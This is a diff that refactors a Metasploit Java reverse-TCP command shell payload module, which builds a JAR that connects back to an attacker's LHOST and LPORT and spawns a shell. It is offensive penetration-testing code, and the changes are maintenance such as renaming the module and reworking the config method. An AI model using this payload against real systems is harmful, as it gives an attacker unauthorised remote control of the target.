@@ -8,7 +8,7 @@ require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
-module Metasploit3
+module MetasploitModule
 
   CachedSize = 7359
 
@@ -16,37 +16,24 @@ module Metasploit3
   include Msf::Payload::Java
   include Msf::Sessions::CommandShellOptions
 
-  def initialize(info = {})
+  def initialize(info={})
     super(merge_info(info,
-      'Name'          => 'Java Command Shell, Reverse TCP Inline',
-      'Description'   => 'Connect back to attacker and spawn a command shell',
-      'Author'        => [
-          'mihi', # all the hard work
-          'egypt' # msf integration
-        ],
-      'License'       => MSF_LICENSE,
-      'Platform'      => [ 'java' ],
-      'Arch'          => ARCH_JAVA,
-      'Handler'       => Msf::Handler::ReverseTcp,
-      'Session'       => Msf::Sessions::CommandShell,
-      'Payload'       =>
-        {
-          'Offsets' => { },
-          'Payload' => ''
-        }
+      'Name'        => 'Java Command Shell, Reverse TCP Inline',
+      'Description' => 'Connect back to attacker and spawn a command shell',
+      'Author'      => ['mihi', 'egypt'],
+      'License'     => MSF_LICENSE,
+      'Platform'    => ['java'],
+      'Arch'        => ARCH_JAVA,
+      'Handler'     => Msf::Handler::ReverseTcp,
+      'Session'     => Msf::Sessions::CommandShell,
+      'Payload'     => {'Offsets' => {}, 'Payload' => ''}
       ))
-    @class_files = [
-      [ "metasploit", "Payload.class" ],
-      [ "javapayload", "stage", "Stage.class" ],
-      [ "javapayload", "stage", "StreamForwarder.class" ],
-      [ "javapayload", "stage", "Shell.class" ],
-    ]
   end
 
   def generate_jar(opts={})
     jar = Rex::Zip::Jar.new
     jar.add_sub("metasploit") if opts[:random]
-    @class_files.each do |path|
+    class_files.each do |path|
       1.upto(path.length - 1) do |idx|
         full = path[0,idx].join("/") + "/"
         if !(jar.entries.map{|e|e.name}.include?(full))
@@ -57,15 +44,16 @@ module Metasploit3
       jar.add_file(path.join("/"), data)
     end
     jar.build_manifest(:main_class => "metasploit.Payload")
-    jar.add_file("metasploit.dat", config)
+    jar.add_file("metasploit.dat", stager_config(opts))
 
     jar
   end
 
-  def config
+  def stager_config(opts={})
+    ds = opts[:datastore] || datastore
     c =  ""
-    c << "LHOST=#{datastore["LHOST"]}\n" if datastore["LHOST"]
-    c << "LPORT=#{datastore["LPORT"]}\n" if datastore["LPORT"]
+    c << "LHOST=#{ds["LHOST"]}\n" if ds["LHOST"]
+    c << "LPORT=#{ds["LPORT"]}\n" if ds["LPORT"]
     # Magical, means use stdin/stdout.  Used for debugging
     #c << "LPORT=0\n"
     c << "EmbeddedStage=Shell\n"
@@ -73,4 +61,12 @@ module Metasploit3
     c
   end
 
+  def class_files
+    [
+      ['metasploit', 'Payload.class'],
+      ['javapayload', 'stage', 'Stage.class'],
+      ['javapayload', 'stage', 'StreamForwarder.class'],
+      ['javapayload', 'stage', 'Shell.class'],
+    ]
+  end
 end
